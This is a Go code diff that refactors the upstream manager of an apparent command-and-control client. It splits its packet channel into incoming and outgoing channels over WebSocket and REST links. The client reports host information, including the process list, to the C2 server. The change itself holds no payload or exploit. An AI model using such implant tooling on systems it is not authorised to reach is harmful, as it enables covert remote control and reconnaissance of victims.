@@ -11,9 +11,10 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-// Upstreammanger provides a connection to the server via Channel
+// Upstreammanger provides a connection to the server via ChannelIncoming
 type UpstreamManager struct {
-	Channel chan model.Packet
+	ChannelIncoming chan model.Packet
+	ChannelOutgoing chan model.Packet
 
 	config   *ClientConfig
 	campaign *campaign.Campaign
@@ -30,19 +31,20 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 	reconnectTimer := MakeSleepTimer()
 
 	u := UpstreamManager{
-		Channel:        make(chan model.Packet),
-		config:         config,
-		campaign:       campaign,
-		UpstreamRest:   &upstreamRest,
-		UpstreamWs:     &upstreamWs,
-		reconnectTimer: &reconnectTimer,
+		ChannelIncoming: make(chan model.Packet),
+		ChannelOutgoing: make(chan model.Packet),
+		config:          config,
+		campaign:        campaign,
+		UpstreamRest:    &upstreamRest,
+		UpstreamWs:      &upstreamWs,
+		reconnectTimer:  &reconnectTimer,
 	}
 	return u
 }
 
 // Connect will try until the C2 can be reached via a upstream.
 func (d *UpstreamManager) Connect() {
-	// Loop which retrieves packets from the active upstream and sends it to client
+	// Thread which retrieves packets from the active upstream and sends it to client
 	var packet model.Packet
 	var connected bool
 	go func() {
@@ -59,7 +61,25 @@ func (d *UpstreamManager) Connect() {
 			}
 
 			// Send the packet to client
-			d.Channel <- packet
+			d.ChannelIncoming <- packet
+		}
+	}()
+
+	// Thread which sends outgoing packets
+	go func() {
+		for {
+			packet := <-d.ChannelOutgoing
+
+			if d.UpstreamWs.Connected() {
+				d.UpstreamWs.ChanOutgoing() <- packet
+				//break
+			} else if d.UpstreamRest.Connected() {
+				d.UpstreamRest.ChanOutgoing() <- packet
+				//break
+			} else {
+				log.Warn("OOB: No active upstreams, sleep and try again")
+				time.Sleep(time.Second * 3)
+			}
 		}
 	}()
 
@@ -105,24 +125,6 @@ func (d *UpstreamManager) ReconnectWebsocket() {
 	d.ConnectRetryForever()
 }
 
-// SendOutofBand will send a packet to the server according to a connected upstream
-func (d *UpstreamManager) DoOutgoingPacket(packet model.Packet) error {
-	for {
-		if d.UpstreamWs.Connected() {
-			d.UpstreamWs.ChanOutgoing() <- packet
-			break
-		} else if d.UpstreamRest.Connected() {
-			d.UpstreamRest.ChanOutgoing() <- packet
-			break
-		} else {
-			log.Warn("OOB: No active upstreams, sleep and try again")
-			time.Sleep(time.Second * 3)
-		}
-	}
-
-	return nil
-}
-
 // sendClientinfo will send client information (like process list) to the server
 func (d *UpstreamManager) sendClientinfo() {
 	arguments := make(model.PacketArgument)
@@ -138,5 +140,6 @@ func (d *UpstreamManager) sendClientinfo() {
 	}
 
 	packet := d.config.MakeClientPacket("clientinfo", arguments, response)
-	d.DoOutgoingPacket(*packet)
+	//d.DoOutgoingPacket(*packet)
+	d.ChannelOutgoing <- *packet
 }
